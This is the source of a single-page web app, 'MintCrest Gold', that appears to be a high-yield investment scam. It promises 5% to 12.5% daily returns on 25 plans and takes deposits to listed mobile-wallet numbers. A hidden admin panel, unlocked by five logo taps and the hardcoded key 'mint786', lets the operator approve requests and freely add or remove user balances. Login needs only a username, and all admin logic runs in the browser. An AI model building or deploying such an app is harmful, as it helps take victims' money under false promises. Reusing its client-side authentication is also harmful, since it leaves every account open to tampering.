<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Live</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #000205; color: white; -webkit-tap-highlight-color: transparent; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); }
        .active-tab { color: #3b82f6; border-top: 3px solid #3b82f6; background: linear-gradient(to top, rgba(59,130,246,0.1), transparent); }
        .page { display: none; }
        .active-page { display: block; animation: fadeIn 0.4s ease; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .notification-banner { background: linear-gradient(90deg, #3b82f6, #1d4ed8); animation: slideIn 0.5s ease; }
        @keyframes slideIn { from { transform: translateY(-100%); } to { transform: translateY(0); } }
    </style>
</head>
<body class="h-screen flex flex-col overflow-hidden">

    <div id="global-note" class="hidden notification-banner p-3 text-center text-[10px] font-black uppercase tracking-widest z-[1000] sticky top-0">
        <span id="note-text">System Update Live</span>
    </div>

    <div class="p-5 flex justify-between items-center bg-black/50 backdrop-blur-md border-b border-white/5">
        <h1 onclick="adminTap()" class="text-xl font-black italic tracking-tighter uppercase select-none">MINT<span class="text-blue-500 text-2xl">CREST</span></h1>
        <div id="v-status" class="bg-blue-600/20 text-blue-400 border border-blue-500/20 px-3 py-1.5 rounded-xl text-[9px] font-black uppercase italic">Standard Agent</div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[2000] bg-[#000205] flex items-center justify-center p-8">
        <div class="w-full max-w-sm text-center">
            <h1 class="text-5xl font-black italic mb-10 tracking-tighter uppercase text-blue-500">ACCESS</h1>
            <div class="glass p-8 rounded-[3rem] border-t-2 border-blue-600 shadow-2xl">
                <input type="text" id="user-name" placeholder="AGENT USERNAME" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold mb-4 uppercase focus:border-blue-500">
                <input type="text" id="ref-code" placeholder="REFERRAL CODE" class="w-full bg-white/5 p-4 rounded-xl border border-white/5 outline-none text-center text-[9px] mb-8 uppercase text-gray-500">
                <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[11px] uppercase tracking-widest shadow-lg shadow-blue-600/30 active:scale-95 transition-all">Authenticate</button>
            </div>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        
        <div id="p-home" class="page active-page p-6">
            <div class="glass p-10 rounded-[3rem] mb-6 border-l-8 border-blue-600 shadow-2xl relative">
                <p class="text-[10px] text-blue-400 font-extrabold mb-1 uppercase tracking-widest">Available Credit</p>
                <h2 class="text-5xl font-black tracking-tighter" id="v-bal">₨ 0</h2>
                <div id="timer-box" class="mt-8 hidden bg-blue-600/5 p-4 rounded-3xl border border-blue-500/10">
                    <p class="text-[8px] text-gray-500 uppercase font-black">Mining Pulse Signal:</p>
                    <div id="countdown" class="text-2xl font-black text-yellow-500 italic tracking-widest font-mono">00:00:00</div>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="glass p-8 rounded-[2rem] text-center active:scale-95 border-b-4 border-blue-600"><span class="text-2xl block mb-2">📥</span><span class="text-[10px] font-black uppercase">Deposit</span></button>
                <button onclick="changePage('withdraw')" class="glass p-8 rounded-[2rem] text-center active:scale-95 border-b-4 border-red-600"><span class="text-2xl block mb-2">📤</span><span class="text-[10px] font-black uppercase">Withdraw</span></button>
            </div>
            
            <button onclick="changePage('invest')" class="w-full mt-4 glass p-6 rounded-[2rem] flex items-center justify-between border-r-8 border-blue-500 active:scale-[0.98]">
                <div class="text-left">
                    <h4 class="text-[11px] font-black uppercase italic">Fleet Marketplace</h4>
                    <p class="text-[8px] text-gray-500 font-bold uppercase">25 Active Investment Nodes</p>
                </div>
                <span class="text-2xl">📈</span>
            </button>
        </div>

        <div id="p-invest" class="page p-6 pb-20">
            <h2 class="text-center font-black italic mb-6 uppercase text-blue-500 text-2xl tracking-tighter">Investment Fleets</h2>
            <div id="plans-list" class="grid grid-cols-1 gap-3"></div>
        </div>

        <div id="p-activity" class="page p-6">
            <h2 class="text-center font-black italic mb-8 uppercase text-blue-400 tracking-widest">Vault History</h2>
            <div id="user-history" class="space-y-2 pb-24 text-center">
                <p class="text-gray-600 text-[10px] font-bold py-10 uppercase">Loading activity...</p>
            </div>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-10 rounded-[3rem] border-t-8 border-blue-600">
                <h3 class="font-black text-blue-500 mb-6 uppercase text-center">Fund Injection</h3>
                <div class="bg-black/80 p-4 rounded-xl mb-6 text-[10px] font-mono text-center border border-white/5">
                    EP: 03379827882 | JC: 03705519562
                </div>
                <input type="number" id="dep-amount" placeholder="PKR AMOUNT" class="w-full bg-white/5 p-4 rounded-xl mb-3 text-center font-bold border border-white/5">
                <input type="text" id="dep-trx" placeholder="TRANSACTION ID" class="w-full bg-white/5 p-4 rounded-xl mb-6 text-center font-bold border border-white/5 uppercase">
                <button onclick="submitDeposit()" class="w-full bg-blue-600 py-4 rounded-xl font-black text-[10px] uppercase">Verify</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-10 rounded-[3rem] border-t-8 border-red-600 text-center">
                <h3 class="font-black text-red-500 mb-6 uppercase">Withdraw Assets</h3>
                <input type="number" id="wd-amount" placeholder="MIN 500" class="w-full bg-white/5 p-4 rounded-xl mb-3 text-center font-bold border border-white/5 outline-none">
                <input type="text" id="wd-method" placeholder="A/C DETAILS" class="w-full bg-white/5 p-4 rounded-xl mb-8 text-center font-bold border border-white/5 uppercase outline-none">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-4 rounded-xl font-black text-[10px] uppercase">Submit Extraction</button>
            </div>
        </div>

        <div id="p-more" class="page p-6 text-center">
            <div class="glass p-10 rounded-[3rem] mb-6">
                <div id="wheel" class="text-7xl mb-6 transition-all duration-[4s] inline-block">🎡</div><br>
                <button onclick="spinNow()" class="bg-yellow-600 px-10 py-3 rounded-xl font-black text-[9px] uppercase">Daily Spin</button>
            </div>
            <button onclick="logout()" class="text-red-500 text-[9px] font-black uppercase opacity-40">Logout Session</button>
        </div>
    </main>

    <nav id="bottom-nav" class="hidden glass p-6 flex justify-around items-center fixed bottom-0 left-0 w-full z-[1500] rounded-t-[3rem] border-t border-white/10">
        <button onclick="changePage('home')" id="n-home" class="active-tab text-2xl">🏠</button>
        <button onclick="changePage('invest')" id="n-invest" class="text-2xl">📈</button>
        <button onclick="changePage('activity')" id="n-activity" class="text-2xl">📜</button>
        <button onclick="changePage('more')" id="n-more" class="text-2xl">⚙️</button>
    </nav>

    <div id="admin-panel" class="fixed inset-0 bg-[#000205] z-[5000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8">
            <h2 class="text-xl font-black text-blue-500 italic uppercase">Control Terminal</h2>
            <button onclick="closeAdmin()" class="bg-red-500/20 text-red-500 px-4 py-2 rounded-lg text-[9px] font-black uppercase">Exit</button>
        </div>

        <div class="glass p-5 rounded-3xl mb-6 border border-blue-500/20">
            <h3 class="text-[9px] font-black uppercase text-blue-400 mb-3">System Notification</h3>
            <input type="text" id="adm-note" placeholder="Broadcast Message..." class="w-full bg-white/5 p-3 rounded-xl mb-3 text-[10px] border border-white/5 outline-none">
            <button onclick="broadcastNote()" class="w-full bg-blue-600 py-2 rounded-lg text-[9px] font-black uppercase">Push Notification</button>
        </div>

        <div class="glass p-5 rounded-3xl mb-6 border border-blue-500/20">
            <h3 class="text-[9px] font-black uppercase text-blue-400 mb-3">Balance Override</h3>
            <input type="text" id="adm-user" placeholder="USER" class="w-full bg-white/5 p-3 rounded-xl mb-2 text-[10px] uppercase border border-white/5">
            <input type="number" id="adm-val" placeholder="PKR" class="w-full bg-white/5 p-3 rounded-xl mb-3 text-[10px] border border-white/5">
            <div class="flex gap-2">
                <button onclick="manualEdit('add')" class="flex-1 bg-green-600 py-3 rounded-lg text-[8px] font-black uppercase">Add</button>
                <button onclick="manualEdit('rem')" class="flex-1 bg-red-600 py-3 rounded-lg text-[8px] font-black uppercase">Rem</button>
            </div>
        </div>

        <div id="adm-requests" class="space-y-3 mb-10"></div>
        <div id="adm-users-list" class="space-y-2"></div>
    </div>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        
        let user = null, tapCount = 0, timerInt = null;
        const plans = []; for(let i=1; i<=25; i++) { plans.push({ id:`p${i}`, n: i<=5?"Bronze":i<=15?"Silver":i<=20?"Gold":"VIP", p: i*1000, r: 5+(i*0.3) }); }

        window.onload = () => { 
            const saved = localStorage.getItem('mc_auth');
            if(saved) { document.getElementById('user-name').value = saved; login(); }
            syncGlobalNote();
        };

        async function login() {
            const name = document.getElementById('user-name').value.trim().toUpperCase();
            if(!name) return;
            try {
                const ref = db.collection("users").doc(name); const doc = await ref.get();
                if(!doc.exists) {
                    await ref.set({ name: name, balance: 0, activePlanId: null, lastRequestTime: Date.now(), time: Date.now() });
                }
                localStorage.setItem('mc_auth', name);
                ref.onSnapshot(d => { user = d.data(); updateUI(); startCountdown(); renderPlans(); checkAutoProfit(); });
                document.getElementById('auth-ui').classList.add('hidden'); 
                document.getElementById('app-ui').classList.remove('hidden'); 
                document.getElementById('bottom-nav').classList.remove('hidden');
                syncHistory();
            } catch(e) { console.error(e); }
        }

        function updateUI() {
            document.getElementById('v-bal').innerText = "₨ " + (user.balance||0).toLocaleString();
            const badge = document.getElementById('v-status');
            if(user.balance > 25000) badge.innerText = "VIP AGENT"; else if(user.balance > 10000) badge.innerText = "PRO AGENT";
        }

        function renderPlans() {
            const l = document.getElementById('plans-list'); l.innerHTML = '';
            plans.forEach(p => {
                const isOwned = user.activePlanId === p.id;
                l.innerHTML += `<div onclick="${isOwned?'':`buy(${p.p},'${p.n}',${p.r},'${p.id}')`}" class="glass p-5 rounded-3xl flex justify-between items-center ${isOwned?'border-blue-500 border-2 bg-blue-500/5':''}">
                    <div><h4 class="font-black text-[9px] text-blue-400 uppercase italic">${p.n} Node ${p.id.substring(1)}</h4><p class="text-[7px] text-gray-500 font-bold uppercase">${p.r}% Daily</p></div>
                    <div class="text-right font-black italic text-sm">₨ ${p.p.toLocaleString()}</div>
                </div>`;
            });
        }

        async function buy(p, n, rate, id) {
            if(user.activePlanId) return alert("Sweetie, only 1 active fleet allowed!");
            if(user.balance < p) return alert("Insufficient Credit!");
            if(confirm("Engage Fleet "+n+"?")) {
                await db.collection("users").doc(user.name).update({ balance: user.balance-p, activePlanId: id, tier: n, dailyRate: rate, lastPrice: p, lastRequestTime: Date.now() });
            }
        }

        function syncHistory() {
            db.collection("requests").where("user", "==", user.name).orderBy("time", "desc").onSnapshot(snap => {
                const list = document.getElementById('user-history');
                if(snap.empty) { list.innerHTML = `<p class="text-gray-600 text-[10px] font-black uppercase py-10 italic">No Activity Recorded Yet</p>`; return; }
                list.innerHTML = '';
                snap.forEach(d => {
                    const r = d.data();
                    list.innerHTML += `<div class="glass p-4 rounded-2xl flex justify-between items-center text-[8px] font-black uppercase mb-1">
                        <div class="text-left">${r.type}<br><span class="opacity-30 text-[6px]">${new Date(r.time).toLocaleDateString()}</span></div>
                        <div>₨ ${r.amount} <span class="${r.status==='approved'?'text-green-500':'text-yellow-500'}">${r.status}</span></div>
                    </div>`;
                });
            });
        }

        function startCountdown() {
            if(!user.activePlanId) return;
            document.getElementById('timer-box').classList.remove('hidden');
            if(timerInt) clearInterval(timerInt);
            timerInt = setInterval(() => {
                const diff = (user.lastRequestTime + 86400000) - Date.now();
                if(diff <= 0) { document.getElementById('countdown').innerText = "SIGNAL READY!"; return; }
                const h = Math.floor(diff/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
                document.getElementById('countdown').innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
            }, 1000);
        }

        async function checkAutoProfit() {
            if(!user.activePlanId || Date.now() - user.lastRequestTime < 86400000) return;
            const amt = Math.floor((user.dailyRate/100)*user.lastPrice);
            await db.collection("requests").add({ user: user.name, amount: amt, type: "FLEET PROFIT", status: "pending", time: Date.now() });
            await db.collection("users").doc(user.name).update({ lastRequestTime: Date.now() });
            alert("Sweetie, Profit Signal Sent!");
        }

        function syncGlobalNote() {
            db.collection("settings").doc("broadcast").onSnapshot(d => {
                if(d.exists && d.data().msg) {
                    document.getElementById('global-note').classList.remove('hidden');
                    document.getElementById('note-text').innerText = d.data().msg;
                } else { document.getElementById('global-note').classList.add('hidden'); }
            });
        }

        // ADMIN FUNCTIONS
        function broadcastNote() { const m = document.getElementById('adm-note').value; db.collection("settings").doc("broadcast").set({ msg: m }); alert("Pushed!"); }
        function adminTap() { tapCount++; if(tapCount>=5) { if(prompt("Key:")==="mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } tapCount=0; } }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        function syncAdmin() {
            db.collection("requests").where("status","==","pending").onSnapshot(snap => {
                const l = document.getElementById('adm-requests'); l.innerHTML = '';
                snap.forEach(doc => {
                    const d = doc.data();
                    l.innerHTML += `<div class="glass p-4 text-[9px] font-black uppercase mb-2 border-l-4 border-yellow-500 flex justify-between items-center">
                        <div>${d.user}<br>${d.type} - Rs ${d.amount}</div>
                        <div class="flex gap-1"><button onclick="hndl('${doc.id}','${d.user}',${d.amount},'approved','${d.type}')" class="bg-green-600 px-3 py-2 rounded-lg text-[8px]">Approve</button></div>
                    </div>`;
                });
            });
        }
        async function hndl(id, u, amt, act, type) { const ref = db.collection("users").doc(u); const d = (await ref.get()).data(); if(type!=="WITHDRAW") await ref.update({ balance: d.balance + amt }); await db.collection("requests").doc(id).update({ status: act }); }
        async function manualEdit(act) { const u = document.getElementById('adm-user').value.toUpperCase(), v = parseInt(document.getElementById('adm-val').value); if(!u || !v) return; const ref = db.collection("users").doc(u); const cur = (await ref.get()).data().balance; await ref.update({ balance: act==='add'?cur+v:cur-v }); alert("Done!"); }
        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.getElementById('p-'+p).classList.add('active-page'); document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active-tab')); document.getElementById('n-'+p).classList.add('active-tab'); }
        async function submitWithdraw() { const a = parseInt(document.getElementById('wd-amount').value), m = document.getElementById('wd-method').value; if(a < 500 || user.balance < a) return alert("Error"); await db.collection("requests").add({ user: user.name, amount: a, details: m, type: "WITHDRAW", status: "pending", time: Date.now() }); await db.collection("users").doc(user.name).update({ balance: user.balance - a }); alert("Success"); changePage('home'); }
        async function submitDeposit() { const a = document.getElementById('dep-amount').value, t = document.getElementById('dep-trx').value; await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, type: "DEPOSIT", status: "pending", time: Date.now() }); alert("Sent"); changePage('home'); }
        function logout() { localStorage.removeItem('mc_auth'); location.reload(); }
        function spinNow() { document.getElementById('wheel').style.transform = `rotate(${Math.floor(2000+Math.random()*2000)}deg)`; }
    </script>
</body>
</html>
